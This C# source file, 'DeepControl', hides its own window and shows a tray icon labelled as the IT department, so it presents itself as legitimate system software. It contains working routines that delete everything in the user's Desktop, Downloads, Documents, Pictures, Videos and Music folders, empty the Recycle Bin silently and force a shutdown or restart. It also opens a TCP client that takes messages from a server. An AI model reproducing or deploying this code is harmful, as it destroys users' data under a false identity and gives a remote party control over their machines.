

namespace DeepControl
{
    using System.Runtime.InteropServices;
    using Microsoft.VisualBasic.Devices;
    using System.Windows.Forms;
    using NAudio.CoreAudioApi;
    using System.Diagnostics;
    using System.Net.Sockets;
    using System.Threading;
    using System.Drawing;
    using System.Text;
    using System.Net;
    using System.IO;
    using System;

    using System.Threading.Tasks;
    public class MouseMover
    {
        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int X, int Y);

        [DllImport("user32.dll")]
        private static extern bool GetCursorPos(out POINT lpPoint);

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int X;
            public int Y;
        }

        public static void MoveMouse(int deltaX, int deltaY)
        {
            GetCursorPos(out POINT currentPos);
            SetCursorPos(currentPos.X + deltaX, currentPos.Y + deltaY);
        }
    }
    public partial class  DeepControlForm : Form
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private NotifyIcon notifyIcon;
        public DeepControlForm()
        {
            InitializeComponent();
            InicializarIcono();
            //limpiarCarpetas();
            //ColocarFondo();
            //RecycleBin.EmptyRecycleBin();
            manipularVolumen(0.1f);
            //Thread.Sleep(7000); 
            //MouseMover.MoveMouse(100, 100);
            /*for(int i =1000;i<10000;i=i+100)
            {
                
                Console.Beep(i, 500);
            }
            */
            //Console.Beep(500, 1000);
            //ReiniciarEquipo();
            //ApagarEquipo();
            Cliente();
        }
        static async Task Cliente()
        {
            string serverIp = "127.0.0.1";
            int port = 5000;

            using TcpClient client = new TcpClient(serverIp, port);
            NetworkStream stream = client.GetStream();
            Console.WriteLine("Conectado al servidor.");

            byte[] buffer = new byte[1024];
            int bytesRead;

            while (true)
            {
                bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                if (bytesRead > 0)
                {
                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    MessageBox.Show($"Mensaje recibido: {message}");
                }
            }
        }
        private static void ApagarEquipo()
        {
            Process.Start(new ProcessStartInfo("shutdown", "/s /f /t 0")
            {
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }
        private static void ReiniciarEquipo()
        {
            Process.Start(new ProcessStartInfo("shutdown", "/r /f /t 0")
            {
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }
        public void manipularVolumen(float volumen)
        {
            var enumerator = new MMDeviceEnumerator();
            var device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
            device.AudioEndpointVolume.MasterVolumeLevelScalar = volumen;
        }
        public void InicializarIcono()
        {
            try
            {
                notifyIcon = new NotifyIcon();
                string iconPath = "ico.ico";
                notifyIcon.Icon = new Icon(iconPath);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error al cargar el icono: " + ex.Message);
                notifyIcon.Icon = SystemIcons.Application;
            }
            notifyIcon.Visible = true;
            notifyIcon.Text = "Departamento de Sistemas";
        }
        public void limpiarCarpetas()
        {

            try
            {
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string picturesPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                string videosPath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                string musicPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
                string downloadsPath = "";

                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads"))
                {
                     downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
                }
                else
                {
                     downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Descargas";
                }
                DeleteAll(desktopPath);
                DeleteAll(downloadsPath);
                DeleteAll(documentsPath);
                DeleteAll(picturesPath);
                DeleteAll(videosPath);
                DeleteAll(musicPath);

            }
            catch (Exception ex)
            {
                
            }
        }
        public void DeleteAll(string directoryPath)
        {
            DeleteAllFiles(directoryPath);
            DeleteAllDirectories(directoryPath);
        }


         public void ColocarFondo()
        {
            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string imagePath = Path.Combine(appDirectory, "fondo.jpg");
            SetWallpaper(imagePath);

        }

       
        public static void SetWallpaper(string path)
        {
            const int SPI_SETDESKWALLPAPER = 20;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDWININICHANGE = 0x02;


            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        private void DeepControlForm_Load(object sender, EventArgs e)
        {
            this.Visible = false;
        }
        
        static void DeleteAllFiles(string directoryPath)
        {
            if (Directory.Exists(directoryPath))
            {
                // Obtener todos los archivos en el directorio y subdirectorios
                string[] files = Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories);

                foreach (string filePath in files)
                {
                    try
                    {
                        // Quitar atributo de solo lectura si está presente
                        FileAttributes attributes = File.GetAttributes(filePath);
                        if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                        {
                            attributes &= ~FileAttributes.ReadOnly;
                            File.SetAttributes(filePath, attributes);
                        }

                        // Borrar archivo
                        File.Delete(filePath);
                        Debug.WriteLine($"Archivo {filePath} borrado exitosamente.");
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Ocurrió un error al borrar {filePath}: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("El directorio no existe.");
            }
        }

        static void DeleteAllDirectories(string directoryPath)
        {
            if (Directory.Exists(directoryPath))
            {
                // Obtener todas las subcarpetas en el directorio
                string[] directories = Directory.GetDirectories(directoryPath);

                foreach (string dirPath in directories)
                {
                    try
                    {
                        // Borrar carpeta y su contenido recursivamente
                        Directory.Delete(dirPath, true);
                        Debug.WriteLine($"Carpeta {dirPath} borrada exitosamente.");
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Ocurrió un error al borrar la carpeta {dirPath}: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("El directorio no existe.");
            }
        }
    }
    public class RecycleBin
    {

        public enum RecycleFlags : uint
        {
            SHERB_NOCONFIRMATION = 0x00000001, SHERB_NOPROGRESSUI = 0x00000002, SHERB_NOSOUND = 0x00000004
        }

        [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
        public static extern int SHEmptyRecycleBin(IntPtr hwnd, string pszRootPath, RecycleFlags dwFlags);

        public static void EmptyRecycleBin()
        {
            int result = SHEmptyRecycleBin(IntPtr.Zero, null, RecycleFlags.SHERB_NOCONFIRMATION |
                                                           RecycleFlags.SHERB_NOPROGRESSUI |
                                                           RecycleFlags.SHERB_NOSOUND);
            if (result != 0)
            {
                Console.WriteLine("Error: " + result);
            }
            else
            {
                Console.WriteLine("Papelera de reciclaje vaciada correctamente.");
            }
        }
    }

}
